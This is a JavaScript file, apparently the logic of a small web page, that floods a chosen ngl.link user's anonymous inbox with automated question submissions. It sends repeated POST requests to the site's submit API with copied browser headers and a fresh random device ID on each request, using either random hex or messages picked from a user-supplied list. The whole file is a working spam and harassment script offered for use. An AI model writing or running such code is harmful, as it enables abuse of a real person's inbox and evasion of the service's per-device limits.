function refCon() {
    let nick = document.getElementById("nick").value;
    let req = document.getElementById("req").value;
    if (nick == "")
        nick = "undefined";
    if (req == "")
        req = "undefined";
    document.getElementById("nickt").innerText = "Nickname: " + nick;
    document.getElementById("reqt").innerText = "Requests: " + req;
}

function update(req) {
    if (req == "")
        return;
    document.getElementById("pen").innerText = "Pending: " + (req - 1);
}

function flood() {
    let nick = document.getElementById("nick").value;
    let qu = document.getElementById("questions").value;
    let req = document.getElementById("req").value;
    let clo = req;
    let ok = 0;
    let err = 0;
    if (nick == null || nick == "")
        alert("Nickname cannot be empty");
    else if (req == null || req < 1)
        alert("Requests cannot be less than 1")
    document.getElementById("fun").removeAttribute("style")
    if (qu.indexOf("|") != -1) {
        let array = qu.split("|");
        while (req > 0) {
            setTimeout(function () {
                fetch("https://ngl.link/api/submit", {
                    "headers": {
                        "accept": "*/*",
                        "accept-language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"AVG Secure Browser\";v=\"109\", \"Chromium\";v=\"109\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "x-requested-with": "XMLHttpRequest",
                        "cookie": "",
                        "Referer": "https://ngl.link/" + nick,
                        "Referrer-Policy": "strict-origin-when-cross-origin"
                    },
                    "body": "username=" + nick + "&question=" + array[Math.floor(Math.random() * array.length)] + "&deviceId=" + crypto.randomUUID() + "&gameSlug=&referrer=",
                    "method": "POST"
                }).then((res) => {
                    clo--;
                    update(clo)
                });
            }, 500 * req)
            req--;
        }
    } else {
        while (req > 0) {
            setTimeout(function () {
                fetch("https://ngl.link/api/submit", {
                    "headers": {
                        "accept": "*/*",
                        "accept-language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"AVG Secure Browser\";v=\"109\", \"Chromium\";v=\"109\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "x-requested-with": "XMLHttpRequest",
                        "cookie": "",
                        "Referer": "https://ngl.link/" + nick,
                        "Referrer-Policy": "strict-origin-when-cross-origin"
                    },
                    "body": "username=" + nick + "&question=" + (Math.random().toString(16).split(".")[1]) + "&deviceId=" + crypto.randomUUID() + "&gameSlug=&referrer=",
                    "method": "POST",
                    "mode": "no-cors",
                }).then((res) => {
                    clo--;
                    update(clo);
                })
            }, 500 * req)
            req--;
        }
    }
}